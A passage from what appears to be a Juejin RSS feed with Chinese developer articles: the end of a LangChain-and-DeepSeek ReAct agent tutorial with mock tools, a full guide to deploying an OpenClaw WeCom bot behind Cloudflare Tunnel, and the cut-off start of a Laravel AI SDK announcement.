<li><strong>执行</strong>：调用不同的工具（搜索工具、爬虫工具、文本分析工具）按步骤执行。</li>
<li><strong>反思</strong>：检查结果是否完整，是否需要调整。</li>
</ol>
<h3 data-id="heading-1"><strong>二、技术选型：为什么是 LangChain + DeepSeek？</strong></h3>
<p>市面上框架很多（LangChain, LlamaIndex, Semantic Kernel等），我优先选择了 <strong>LangChain</strong>，原因很简单：</p>
<ul>
<li><strong>生态成熟</strong>：社区活跃，文档和样例多，遇到问题容易找到解决方案。</li>
<li><strong>工具链丰富</strong>：内置和社区提供了大量现成的Tool（搜索、计算、API调用等），能快速搭建。</li>
<li><strong>抽象层次合理</strong>：它提供了Agent、Tool、Memory等核心概念的清晰抽象，既不会太底层，也不会太黑盒。</li>
</ul>
<p>对于大模型（LLM），我选择了 <strong>DeepSeek</strong>，理由也很直接：</p>
<ul>
<li><strong>能力强且免费</strong>：在代码和逻辑推理上表现不错，完全满足Demo需求，没有额度焦虑可以随便“造”。</li>
<li><strong>API友好</strong>：接入简单，响应速度快。</li>
</ul>
<h3 data-id="heading-2"><strong>三、实战拆解：代码是如何一步步实现的</strong></h3>
<p>这里我剥离了项目结构，聚焦最核心的链路。完整项目代码已放在文末的GitHub仓库里。</p>
<p><strong>第一步：搭建智能体的“大脑” (LLM + Prompt)</strong></p>
<p>智能体的核心是一个能进行任务规划和链式思考的LLM。LangChain的 <code>create_react_agent</code> 帮我们封装了复杂的Prompt工程。</p>
<p>python</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain <span class="hljs-keyword">import</span> hub
<span class="hljs-keyword">from</span> langchain.agents <span class="hljs-keyword">import</span> create_react_agent, AgentExecutor
<span class="hljs-keyword">from</span> langchain.tools <span class="hljs-keyword">import</span> Tool
<span class="hljs-keyword">from</span> langchain_community.llms <span class="hljs-keyword">import</span> DeepSeek

<span class="hljs-comment"># 1. 初始化大脑（LLM）</span>
llm = DeepSeek(model=<span class="hljs-string">"deepseek-chat"</span>, temperature=<span class="hljs-number">0.1</span>) <span class="hljs-comment"># temperature调低，让输出更稳定</span>

<span class="hljs-comment"># 2. 拉取一个优化过的ReAct提示模板（这是LangChain的神器之一）</span>
prompt = hub.pull(<span class="hljs-string">"hwchase17/react"</span>)
</code></pre>
<p><strong>第二步：为智能体打造“工具箱” (Tools)</strong></p>
<p>智能体之所以能“执行”，靠的就是Tools。我给它配备了三个基础工具：</p>
<p>python</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 工具1：网络搜索（模拟）</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">search_web</span>(<span class="hljs-params">query: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""模拟搜索今日热点。实际可接入SerperAPI或Google Search API。"""</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[智能体正在搜索]: <span class="hljs-subst">{query}</span>"</span>)
    <span class="hljs-comment"># 这里是模拟数据，真实情况调用API</span>
    mock_hot_news = [
        <span class="hljs-string">"AI编程助手CodeGeeX发布4.0版本，宣称效率提升50%"</span>,
        <span class="hljs-string">"深度学习框架PyTorch宣布官方支持Apple Silicon GPU加速"</span>,
        <span class="hljs-string">"2024年DevOps状态报告：AI在自动化测试中渗透率超30%"</span>
    ]
    <span class="hljs-keyword">return</span> <span class="hljs-string">"\n"</span>.join(mock_hot_news)

<span class="hljs-comment"># 工具2：内容提取（模拟）</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_content</span>(<span class="hljs-params">url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""模拟根据链接获取详细内容。"""</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[智能体正在抓取内容]: <span class="hljs-subst">{url}</span>"</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"这是关于'<span class="hljs-subst">{url}</span>'的详细报道内容摘要..."</span>

<span class="hljs-comment"># 工具3：文本总结</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">summarize_text</span>(<span class="hljs-params">text: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""调用LLM对长文本进行总结。"""</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[智能体正在总结内容]..."</span>)
    <span class="hljs-comment"># 这里实际上可以再调一次LLM，为简化，直接返回模拟总结</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"核心要点：<span class="hljs-subst">{text[:<span class="hljs-number">50</span>]}</span>..."</span>

<span class="hljs-comment"># 将函数包装成LangChain Tool</span>
tools = [
    Tool(name=<span class="hljs-string">"Search"</span>, func=search_web, description=<span class="hljs-string">"当你需要获取最新热点或搜索信息时使用此工具。"</span>),
    Tool(name=<span class="hljs-string">"FetchContent"</span>, func=fetch_content, description=<span class="hljs-string">"当你需要获取某个链接的具体内容时使用此工具。"</span>),
    Tool(name=<span class="hljs-string">"Summarizer"</span>, func=summarize_text, description=<span class="hljs-string">"当你需要总结长文本内容时使用此工具。"</span>),
]
</code></pre>
<p><strong>第三步：组装并运行智能体</strong></p>
<p>把大脑、工具和提示词组装起来，智能体就诞生了。</p>
<p>python</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 3. 创建ReAct智能体</span>
agent = create_react_agent(llm, tools, prompt)

<span class="hljs-comment"># 4. 创建执行器，它会处理智能体的思考循环</span>
agent_executor = AgentExecutor(agent=agent, tools=tools, verbose=<span class="hljs-literal">True</span>, handle_parsing_errors=<span class="hljs-literal">True</span>)

<span class="hljs-comment"># 5. 发布任务！</span>
result = agent_executor.invoke({
    <span class="hljs-string">"input"</span>: <span class="hljs-string">"请帮我分析今天的科技热点，并整理成一份简短的要点简报。"</span>
})

<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span>*<span class="hljs-number">50</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"【智能体生成的最终简报】"</span>)
<span class="hljs-built_in">print</span>(result[<span class="hljs-string">"output"</span>])
<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span>*<span class="hljs-number">50</span>)
</code></pre>
<h3 data-id="heading-3"><strong>四、运行效果与核心洞察</strong></h3>
<p>当你运行上面的代码（记得安装依赖并填入自己的API Key），会在控制台看到类似下面的<strong>思考过程</strong>：</p>
<p>text</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-quote">&gt; 进入新的AgentExecutor链...</span>
思考：用户需要一份今日科技热点简报。我需要先搜索热点，然后获取详细信息，最后总结。
行动：Search
行动输入：今日科技热点
[<span class="hljs-symbol">智能体正在搜索</span>]: <span class="hljs-link">今日科技热点</span>
观察：AI编程助手CodeGeeX发布4.0版本... (省略)
思考：我得到了几条热点标题，需要获取其中一两条的详细内容来总结。
行动：FetchContent
行动输入：AI编程助手CodeGeeX发布4.0版本
[<span class="hljs-symbol">智能体正在抓取内容</span>]: <span class="hljs-link">AI编程助手CodeGeeX发布4.0版本</span>
观察：这是关于'AI编程助手...'的详细报道内容摘要...
思考：现在我有了一些细节，可以开始总结了。
行动：Summarizer
行动输入：[将搜索和抓取的内容组合]
[智能体正在总结内容]...
观察：核心要点：AI编程助手效率提升...
思考：我已经完成了热点搜索、内容获取和总结，可以给出最终答案了。
最终答案：根据今日热点，为您整理简报如下：1. AI编程助手CodeGeeX 4.0发布... (省略)
</code></pre>
<p><strong>通过这个Demo，我清晰地验证了几个关键点：</strong></p>
<ol>
<li><strong>智能体的本质是“规划+执行”循环</strong>：它通过LLM进行动态的任务拆解（规划），并选择合适的工具执行。</li>
<li><strong>工具（Tools）是能力边界</strong>：智能体能做什么，完全取决于你给它提供了什么工具。<strong>赋予它联网搜索、执行代码、操作系统的能力，它就能变得无比强大。</strong></li>
<li><strong>Prompt是灵魂</strong>：<code>hwchase17/react</code> 这个Prompt模板已经嵌入了“Thought/Action/Observation”的格式，引导LLM进行正确推理。微调Prompt能极大改善表现。</li>
</ol>
<h3 data-id="heading-4"><strong>五、踩坑与优化建议</strong></h3>
<ol>
<li><strong>无限循环坑</strong>：智能体有时会陷入“思考-行动”死循环。<strong>务必在<code>AgentExecutor</code>中设置<code>max_iterations</code>参数</strong>（比如10-15次），强制退出。</li>
<li><strong>工具描述坑</strong>：<code>Tool</code>的<code>description</code>至关重要！LLM完全依赖描述来决定是否调用该工具。描述要<strong>清晰、具体，说明适用场景</strong>。</li>
<li><strong>错误处理坑</strong>：工具执行可能失败（如网络超时），需要在工具函数内部做好异常处理，并返回清晰的错误信息给LLM，让它能调整策略。</li>
<li><strong>成本与延迟坑</strong>：每次思考和行动都可能调用LLM，复杂任务成本不低。Demo阶段可以使用DeepSeek这类性价比高的模型，上线前需做好预算和延迟评估。</li>
</ol>
<h3 data-id="heading-5"><strong>最后，聊聊“从0到1”之后的事</strong></h3>
<p>这个Demo只是一个起点。当你掌握了这个最小闭环，就可以尝试：</p>
<ul>
<li><strong>接入真实工具</strong>：替换掉模拟工具，接入SerperAPI（搜索）、Requests（爬虫）、ShellTool（执行命令）。</li>
<li><strong>尝试多智能体协作</strong>：让一个“主管”智能体协调多个“工人”智能体分工合作。</li>
<li><strong>加入记忆（Memory）</strong> ：让智能体记住之前的对话和结果，实现更连贯的长期任务。</li>
</ul>
<p><strong>技术本身不是目的，解决问题才是。</strong>  动手搭建一次，你对所有那些“神奇”的Agent产品的理解，会完全不一样。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🚀 终极方案：OpenClaw + Cloudflare Tunnel 企业微信机器人部署指南]]></title>    <link>https://juejin.cn/post/7603246733316866102</link>    <guid>https://juejin.cn/post/7603246733316866102</guid>    <pubDate>2026-02-05T12:28:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603246733316866102" data-draft-id="7603352061467951146" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🚀 终极方案：OpenClaw + Cloudflare Tunnel 企业微信机器人部署指南"/> <meta itemprop="keywords" content="Node.js"/> <meta itemprop="datePublished" content="2026-02-05T12:28:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="隔壁晓晓"/> <meta itemprop="url" content="https://juejin.cn/user/4499656909521368"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🚀 终极方案：OpenClaw + Cloudflare Tunnel 企业微信机器人部署指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4499656909521368/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    隔壁晓晓
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T12:28:02.000Z" title="Thu Feb 05 2026 12:28:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🚀 终极方案：OpenClaw + Cloudflare Tunnel 企业微信机器人部署指南</h2>
<blockquote>
<p><strong>版本</strong>：Final Edition (2026.02)
<strong>方案特点</strong>：无需公网IP、零端口开放、Cloudflare 全球加速、配置极简。
<strong>适用环境</strong>：任何能联网的 Mac/Windows/Linux 设备（即便是光猫后的多层内网）。</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">🏗️ 架构对比</h3>
<ul>
<li><strong>旧时代 (FRP)</strong>: <code>企业微信</code> -&gt; <code>公网服务器(frps)</code> -&gt; <code>路由器端口映射</code> -&gt; <code>本机(frpc)</code> -&gt; <code>OpenClaw</code> (链路长，配置繁琐，需公网IP)</li>
<li><strong>新时代 (CF Tunnel)</strong>: <code>企业微信</code> -&gt; <code>Cloudflare边缘节点</code> -&gt; <code>加密隧道</code> -&gt; <code>本机(cloudflared)</code> -&gt; <code>OpenClaw</code> (链路短，无需公网IP，起飞！)</li>
</ul>
<hr/>
<h3 data-id="heading-2">🛠️ 第一步：OpenClaw 基础环境搭建</h3>
<p>(如果你之前已经配好了 OpenClaw，可以跳过安装，直接检查配置文件。)</p>
<h4 data-id="heading-3">1. 安装核心</h4>
<pre><code class="hljs language-bash" lang="bash">npm install -g openclaw
openclaw plugins install openclaw-plugin-wecom
</code></pre>
<h4 data-id="heading-4">2. 编写/检查配置文件 (关键！)</h4>
<p>文件路径：<code>~/.openclaw/openclaw.json</code></p>
<p><strong>⚠️ 避坑重点</strong>：</p>
<ol>
<li>必须显式启用插件 <code>plugins.entries</code>。</li>
<li><strong><code>encodingAesKey</code></strong> 必须是小驼峰命名（企业微信后台复制过来要把 Key 名改对）。</li>
<li>在 Tunnel 模式下，OpenClaw 只需要监听本地即可，但也建议放开局域网权限方便调试。</li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"plugins"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"entries"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"wecom"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"channels"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"wecom"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"token"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"你的Token"</span><span class="hljs-punctuation">,</span>          <span class="hljs-comment">// 从企业微信后台获取</span>
      <span class="hljs-attr">"encodingAesKey"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"你的43位Key"</span> <span class="hljs-comment">// 从企业微信后台获取</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"gateway"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"bind"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"lan"</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 建议设为 lan，方便调试；Tunnel 访问 localhost 也没问题</span>
    <span class="hljs-attr">"port"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">18789</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>启动网关：</p>
<pre><code class="hljs language-bash" lang="bash">openclaw gateway restart
</code></pre>
<hr/>
<h3 data-id="heading-5">🚇 第二步：部署 Cloudflare Tunnel (重头戏)</h3>
<p>前提：你需要有一个域名托管在 Cloudflare 上（比如 <code>shuqi.run</code>）。</p>
<h4 data-id="heading-6">1. 安装 cloudflared</h4>
<p>Mac 用户直接用 Homebrew：</p>
<pre><code class="hljs language-bash" lang="bash">brew install cloudflared
</code></pre>
<pre><code class="hljs language-arduino" lang="arduino">cloudflared tunnel run --url http:<span class="hljs-comment">//localhost:18789</span>
</code></pre>
<h4 data-id="heading-7">2. 登录并授权</h4>
<pre><code class="hljs language-bash" lang="bash">cloudflared tunnel login
</code></pre>
<p>终端会给出一个 URL，在浏览器打开，选择你的域名进行授权。</p>
<h4 data-id="heading-8">3. 创建隧道</h4>
<p>给隧道起个名字，比如 <code>bot-tunnel</code>：</p>
<pre><code class="hljs language-bash" lang="bash">cloudflared tunnel create bot-tunnel
</code></pre>
<p><em>成功后会返回一个 Tunnel ID，记下来。</em></p>
<h4 data-id="heading-9">4. 绑定域名 (DNS 解析)</h4>
<p>把你想要的子域名（例如 <code>bot.shuqi.run</code>）绑定到这个隧道：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 语法: cloudflared tunnel route dns [隧道名] [你的域名]</span>
cloudflared tunnel route dns bot-tunnel bot.shuqi.run
</code></pre>
<h4 data-id="heading-10">5. 配置流量转发</h4>
<p>创建配置文件 <code>~/.cloudflared/config.yml</code>：</p>
<pre><code class="hljs language-bash" lang="bash">nano ~/.cloudflared/config.yml
</code></pre>
<p>写入以下内容（注意替换 Tunnel ID）：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">tunnel:</span> <span class="hljs-string">&lt;你的-Tunnel-ID-xxxxxxxx&gt;</span>
<span class="hljs-attr">credentials-file:</span> <span class="hljs-string">/Users/你的用户名/.cloudflared/&lt;你的-Tunnel-ID&gt;.json</span>

<span class="hljs-attr">ingress:</span>
  <span class="hljs-comment"># 将 bot.shuqi.run 的流量转发给本地 OpenClaw 端口</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">hostname:</span> <span class="hljs-string">bot.shuqi.run</span>
    <span class="hljs-attr">service:</span> <span class="hljs-string">http://localhost:18789</span>
  <span class="hljs-comment"># 兜底规则（必须有）</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">service:</span> <span class="hljs-string">http_status:404</span>
</code></pre>
<h4 data-id="heading-11">6. 启动隧道</h4>
<pre><code class="hljs language-bash" lang="bash">cloudflared tunnel run bot-tunnel
</code></pre>
<p>看到类似 <code>Connection ... registered</code> 的日志，说明隧道已打通！此时全球任何地方访问 <code>https://bot.shuqi.run</code> 都会直接连到你 Mac 上的 OpenClaw。</p>
<hr/>
<h3 data-id="heading-12">📱 第三步：企业微信后台最终对接</h3>
<p>回到 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwork.weixin.qq.com%2Fwework_admin" target="_blank" title="https://work.weixin.qq.com/wework_admin" ref="nofollow noopener noreferrer">企业微信管理后台</a>，进入 <strong>应用管理 -&gt; 自建应用 -&gt; API接收消息</strong>。</p>
<h4 data-id="heading-13">填写参数</h4>
<ul>
<li><strong>URL</strong>: <code>https://bot.shuqi.run/wecom</code>
<ul>
<li><em>注意：CF Tunnel 自动提供 HTTPS，这里直接填 HTTPS 即可，完美符合企业微信安全性要求。</em></li>
<li><em>注意：路径必须是 <code>/wecom</code>。</em></li>
</ul>
</li>
<li><strong>Token</strong>: 与 <code>openclaw.json</code> 一致。</li>
<li><strong>EncodingAESKey</strong>: 与 <code>openclaw.json</code> 一致。</li>
</ul>
<h4 data-id="heading-14">点击保存</h4>
<ul>
<li>Cloudflare Tunnel 速度极快，通常会秒过验证。</li>
<li>如果提示校验成功，去企业微信 App 发送“你好”测试。</li>
</ul>
<hr/>
<h3 data-id="heading-15">⚡ 进阶技巧：让隧道后台运行</h3>
<p>调试没问题后，肯定不想一直开着终端窗口。可以让 cloudflared 变成后台服务自动运行。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装系统服务</span>
sudo cloudflared service install

<span class="hljs-comment"># 启动服务</span>
sudo cloudflared service start
</code></pre>
<p>这样你的 Mac 只要开机，隧道就自动连通，机器人 24 小时在线。</p>
<hr/>
<h3 data-id="heading-16">🏆 总结</h3>
<p>使用 Cloudflare Tunnel 后，我们彻底告别了：
❌ 繁琐的路由器端口映射
❌ 昂贵的公网服务器月租
❌ 令人头秃的防火墙配置
❌ Nginx 反向代理配置</p>
<p><strong>这就是目前最优雅、最高效的企业微信机器人部署方案。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Laravel AI SDK 正式发布]]></title>    <link>https://juejin.cn/post/7603216479835947059</link>    <guid>https://juejin.cn/post/7603216479835947059</guid>    <pubDate>2026-02-06T00:22:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603216479835947059" data-draft-id="7603227363821256730" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Laravel AI SDK 正式发布"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-06T00:22:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Laravel AI SDK 正式发布
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-06T00:22:04.000Z" title="Fri Feb 06 2026 00:22:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body 